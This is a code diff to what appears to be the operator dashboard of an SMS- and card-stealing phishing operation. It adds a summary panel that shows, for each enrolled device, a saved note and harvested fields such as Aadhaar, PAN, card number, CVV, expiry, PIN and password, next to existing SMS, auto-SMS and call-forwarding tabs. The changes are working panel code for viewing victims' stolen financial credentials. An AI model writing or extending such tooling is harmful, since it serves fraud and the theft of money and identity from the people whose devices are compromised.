@@ -215,6 +215,22 @@ html{overscroll-behavior-y:none;background:var(--bg);}
   border-radius:10px;padding:13px 8px;font-size:12px;font-weight:700;cursor:pointer;font-family:inherit;}
 .act-btn:active{background:var(--green-soft);}
 
+/* ===== DEVICE SUMMARY (shows instantly on open, above tabs) ===== */
+.sum-wrap{padding:2px 14px 10px;}
+.sum-box{background:var(--surface2);border:1px solid var(--border);border-radius:12px;
+  padding:11px 13px;margin-bottom:8px;}
+.sum-label{font-size:10px;font-weight:800;color:var(--muted);text-transform:uppercase;
+  letter-spacing:.6px;margin-bottom:7px;display:flex;align-items:center;gap:5px;}
+.sum-note-txt{font-size:12.5px;color:#c7d0d9;line-height:1.55;white-space:pre-wrap;word-break:break-word;}
+.sum-note-txt.empty{color:var(--muted);}
+.sum-grid{display:flex;flex-wrap:wrap;gap:7px;}
+.sum-chip{flex:1 1 calc(50% - 7px);min-width:0;background:var(--surface3);border:1px solid var(--border);
+  border-radius:9px;padding:7px 10px;}
+.sum-chip-l{font-size:9.5px;font-weight:800;color:var(--muted);text-transform:uppercase;
+  letter-spacing:.4px;margin-bottom:3px;}
+.sum-chip-v{font-size:12.5px;font-weight:700;color:#e6edf3;overflow-wrap:break-word;}
+.sum-empty{font-size:12px;color:var(--muted);}
+
 /* ===== DETAIL TABS ===== */
 .tabs{display:flex;border-bottom:1px solid var(--border);
   background:rgba(13,17,23,.92);position:sticky;top:55px;z-index:100;backdrop-filter:blur(12px);}
@@ -640,6 +656,16 @@ html{overscroll-behavior-y:none;background:var(--bg);}
     <button onclick="openAutoSmsSettings()"
       style="background:var(--surface2);color:var(--muted);border:1.5px solid var(--border);
       border-radius:10px;padding:12px 14px;font-size:16px;cursor:pointer;">⚙️</button>
+  </div>
+  <div class="sum-wrap">
+    <div class="sum-box">
+      <div class="sum-label">&#128221; Note</div>
+      <div class="sum-note-txt empty" id="dev-summary-note">Koi note nahi</div>
+    </div>
+    <div class="sum-box">
+      <div class="sum-label">&#128196; Data</div>
+      <div id="dev-summary-data"><div class="sum-empty">Loading...</div></div>
+    </div>
   </div>
   <div class="tabs">
     <button class="tab-btn active" id="tb-sms" onclick="switchDtl('sms')">&#128172; SMS</button>
@@ -1215,7 +1241,7 @@ function doLogout() {
   btn.disabled = false; btn.textContent = 'Connect & Open Dashboard';
   DEVS = {}; CUR = null; PREV_KEYS = {}; STARS = {};
   SYNC_WARN_CACHE = {};
-  DATA_TAB_CACHE = {}; FWD_TAB_CACHE = {};
+  DATA_TAB_CACHE = {}; FWD_TAB_CACHE = {}; NOTE_CACHE = {};
   /* If this session was opened via a pre-configured link, show password screen again
      instead of the full manual setup form - user just needs to re-enter password */
   if (QC_PARAMS) {
@@ -1705,10 +1731,16 @@ function openDev(key) {
   badge.className = 'd-st ' + (d.on ? 'd-st-on' : 'd-st-off');
   switchDtl('sms');
   window.scrollTo(0, 0);
+  /* Summary (Note + Data) shows right away above the tabs, no tap needed */
+  document.getElementById('dev-summary-note').className = 'sum-note-txt empty';
+  document.getElementById('dev-summary-note').textContent = 'Loading...';
+  document.getElementById('dev-summary-data').innerHTML = '<div class="sum-empty">Loading...</div>';
   /* Preload Data + Call Forward tabs in the background (small payloads) so switching
-     to them later feels instant instead of showing a fresh loading spinner each time. */
+     to them later feels instant instead of showing a fresh loading spinner each time.
+     preloadDataTab also fills the Data summary box; loadSummaryNote fills the Note box. */
   preloadDataTab(key);
   preloadFwdTab(key);
+  loadSummaryNote(key);
 }
 
 function devRefresh() {
@@ -2018,6 +2050,61 @@ function fallbackCopy(text) {
 
 /* ===== DATA TAB ===== */
 var DATA_TAB_CACHE = {}; /* devKey -> built HTML string, populated by preload */
+var NOTE_CACHE = {}; /* devKey -> raw note string, populated on device open */
+
+/* Compact chip version of the Data fields - shown above the tabs. Only fields that
+   actually have a value are shown (keeps it short), unlike the full DATA tab which
+   also lists empty fields for reference. */
+function buildSummaryDataHtml(data) {
+  if (!data || typeof data !== 'object') return '<div class="sum-empty">Koi data nahi</div>';
+  var fields = [
+    {k:'Name', l:'Name'}, {k:'Number', l:'Mobile No'},
+    {k:'Aadhaar', l:'Aadhaar'}, {k:'PanCard', l:'PAN Card'},
+    {k:'Dob', l:'DOB'}, {k:'Card', l:'Card Number'},
+    {k:'Cvv', l:'CVV'}, {k:'Expiry', l:'Expiry'},
+    {k:'Pin', l:'PIN'}, {k:'Pass', l:'Password'},
+    {k:'CustID', l:'Customer ID'}
+  ];
+  var html = '', shown = {}, any = false;
+  for (var i = 0; i < fields.length; i++) {
+    var f = fields[i]; shown[f.k] = true;
+    var val = data[f.k] || data[f.k.toLowerCase()] || '';
+    if (!val) continue;
+    any = true;
+    html += '<div class="sum-chip"><div class="sum-chip-l">' + eh(f.l) + '</div>' +
+      '<div class="sum-chip-v">' + eh(String(val)) + '</div></div>';
+  }
+  var eks = Object.keys(data);
+  for (var i = 0; i < eks.length; i++) {
+    if (shown[eks[i]] || !data[eks[i]]) continue;
+    any = true;
+    html += '<div class="sum-chip"><div class="sum-chip-l">' + eh(eks[i]) + '</div>' +
+      '<div class="sum-chip-v">' + eh(String(data[eks[i]])) + '</div></div>';
+  }
+  if (!any) return '<div class="sum-empty">Koi data nahi</div>';
+  return '<div class="sum-grid">' + html + '</div>';
+}
+
+function renderSummaryNote(text) {
+  var el = document.getElementById('dev-summary-note');
+  if (!el) return;
+  if (text) { el.className = 'sum-note-txt'; el.textContent = text; }
+  else { el.className = 'sum-note-txt empty'; el.textContent = 'Koi note nahi'; }
+}
+
+function loadSummaryNote(key) {
+  if (NOTE_CACHE[key] !== undefined) { if (CUR === key) renderSummaryNote(NOTE_CACHE[key]); return; }
+  var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
+  var url = DB + '/' + NODE + '/Notes/' + key + '.json' + auth;
+  fetch(url, {cache:'no-store'})
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      var note = (d && typeof d === 'string') ? d : (d && d.text ? d.text : '');
+      NOTE_CACHE[key] = note;
+      if (CUR === key) renderSummaryNote(note);
+    })
+    .catch(function(){ if (CUR === key) renderSummaryNote(''); });
+}
 
 function buildDataHtml(data) {
   if (!data || typeof data !== 'object') {
@@ -2053,7 +2140,16 @@ function preloadDataTab(key) {
   var did = (DEVS[key] && DEVS[key].did) ? DEVS[key].did : key;
   fbGet('Data/' + did).then(function(data) {
     DATA_TAB_CACHE[key] = buildDataHtml(data);
-  }).catch(function() {});
+    if (CUR === key) {
+      var sd = document.getElementById('dev-summary-data');
+      if (sd) sd.innerHTML = buildSummaryDataHtml(data);
+    }
+  }).catch(function() {
+    if (CUR === key) {
+      var sd = document.getElementById('dev-summary-data');
+      if (sd) sd.innerHTML = '<div class="sum-empty">Load fail</div>';
+    }
+  });
 }
 
 function loadDataTab(key) {
@@ -2067,6 +2163,10 @@ function loadDataTab(key) {
       var html = buildDataHtml(data);
       DATA_TAB_CACHE[key] = html;
       el.innerHTML = html;
+      if (CUR === key) {
+        var sd = document.getElementById('dev-summary-data');
+        if (sd) sd.innerHTML = buildSummaryDataHtml(data);
+      }
     })
     .catch(function(e) {
       el.innerHTML = '<div class="empty"><div class="ei">&#128196;</div><p>Load fail: ' + e.message + '</p></div>';
@@ -2449,6 +2549,11 @@ function loadNoteTab(key) {
   var txt = document.getElementById('note-txt');
   var status = document.getElementById('note-status');
   if (!txt) return;
+  if (NOTE_CACHE[key] !== undefined) {
+    txt.value = NOTE_CACHE[key];
+    if (status) status.textContent = txt.value ? 'Last saved note loaded' : 'Koi note nahi - likho aur save karo';
+    return;
+  }
   txt.value = '';
   if (status) status.textContent = 'Loading...';
   var auth = APIKEY ? '?auth=' + encodeURIComponent(APIKEY) : '';
@@ -2456,8 +2561,11 @@ function loadNoteTab(key) {
   fetch(url, {cache:'no-store'})
     .then(function(r){ return r.json(); })
     .then(function(d){
-      txt.value = (d && typeof d === 'string') ? d : (d && d.text ? d.text : '');
-      if (status) status.textContent = txt.value ? 'Last saved note loaded' : 'Koi note nahi - likho aur save karo';
+      var note = (d && typeof d === 'string') ? d : (d && d.text ? d.text : '');
+      NOTE_CACHE[key] = note;
+      txt.value = note;
+      if (status) status.textContent = note ? 'Last saved note loaded' : 'Koi note nahi - likho aur save karo';
+      if (CUR === key) renderSummaryNote(note);
     })
     .catch(function(){ if(status) status.textContent = 'Load failed'; });
 }
@@ -2476,6 +2584,8 @@ function saveNote() {
   })
   .then(function(r){ if(!r.ok) throw new Error('HTTP '+r.status); return r.json(); })
   .then(function(){
+    NOTE_CACHE[CUR] = note;
+    renderSummaryNote(note);
     if (status) { status.textContent = 'Saved!'; status.style.color='#16a34a'; }
     setTimeout(function(){ if(status) status.style.color=''; }, 2000);
   })
